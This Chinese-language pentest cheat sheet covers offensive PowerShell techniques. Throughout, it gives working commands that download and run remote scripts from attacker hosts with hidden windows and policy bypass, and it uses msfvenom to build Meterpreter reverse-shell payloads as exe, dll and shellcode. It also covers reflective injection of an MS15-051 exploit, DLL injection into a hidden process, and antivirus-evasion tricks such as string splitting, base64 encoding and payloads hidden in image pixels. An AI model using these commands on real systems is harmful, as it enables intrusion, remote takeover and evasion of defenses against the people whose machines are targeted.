    查看版本$PSVersionTable
  #### 远程执行
	>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('');Invoke-xxx"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png)
  #### 加载exe
	msfvenom生成exe木马
	>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe > /var/www/html/1.exe  
	使用powersploit的Invoke-ReflectivePEInjection.ps1脚本
	>powershell.exe -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR" 
  #### EXE2PS1
	http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1
	将exe转换为base64
	>Import-Module .\Convert-BinaryToString.ps1
	>Convert-BinaryToString -FilePath .\ms15051.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png)

	http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
	Invoke-ReflectivePEInjection.ps1文件头部添加
	Function MS15051{
	<#
	.SYNOPSIS    
	.EXAMPLE
    C:\PS> MS15051 -Command "whoami"
	#>
	 [CmdletBinding()]
	    param(
	        [Parameter(Mandatory = $False)]
	        [string]
	        $Command
      )
	$InputString = "文件的base64编码"
	$PEBytes = [System.Convert]::FromBase64String($InputString)
	文件尾部添加
	write-host ("[+] Executing Command: "+$Command)  -foregroundcolor "Green"
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command 
	write-host ("[+] Done !")  -foregroundcolor "Green"
	}
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png)

	远程下载执行
	>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1'); MS15051 –Command \"whoami\""
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png)
  #### 绕过策略
	>powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行
	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-xxx.ps1');invoke-xxx"
	>powershell -exec bypass -File ./a.ps1&>Import-Module xxx
  ##### Base64
	>use exploit/multi/script/web_delivery|target=2(PSH)
	&
	>cat payload.txt | iconv --to-code UTF-16LE |base64
	>powershell -ep bypass -enc base64code
  ##### 写入bat绕过
	powershell -exec bypass -File ./a.ps1 
	将该命令保存为c.bat
  ##### 拼接拆分字符串
	powershell.exe  
	"
	$c1='powershell -c IEX'; 
	$c2='(New-Object Net.WebClient).Downlo'; 
	$c3='adString("http://192.168.197.192/a.ps1")'; 
	echo ($c1,$c2,$c3) 
	" 
	先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。
	powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)
  ##### Replace替换函数
	powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)" 
  ##### HTTP字符拼接绕过
	也可以对http字符进行绕过，同样可以bypass
	powershell "$a='IEX((new-object net.webclient).downloadstring("ht';$b='tp://192.168.197.192/a.ps1"))';IEX ($a+$b)"  
  ##### 图片免杀
	通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。
	https://github.com/peewpw/Invoke-PSImage
	1900*1200的图片x.jpg。
	C:\>powershell 
	PS C:\> Import-Module .\Invoke-PSImage.ps1 
	PS C:\> Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web 
	a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。
	将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。
  ##### 加载shellcode
	msfvenom生成脚本木马
	>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  
	在windows靶机上运行一下命令
	PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") 
	PS >IEX(New-Object Net.WebClient).DownloadString("http://192.168.72.164/test") 
	Invoke-Shellcode -Shellcode $buf -Force  运行木马 
	使用Invoke-Shellcode.ps1脚本执行shellcode
	即可反弹meterpreter shell
  ##### 加载dll
	使用msfvenom 生成dll木马脚本
	>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 
	将生成的dll上传到目标的C盘。在靶机上执行以下命令
	PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1") 
	Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  
	创建新的进程启动记事本，并设置为隐藏
	Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID  
	Msf
	>use exploit/multi/handler
	>set payload windows/x64/meterpreter/reverse_tcp
	>run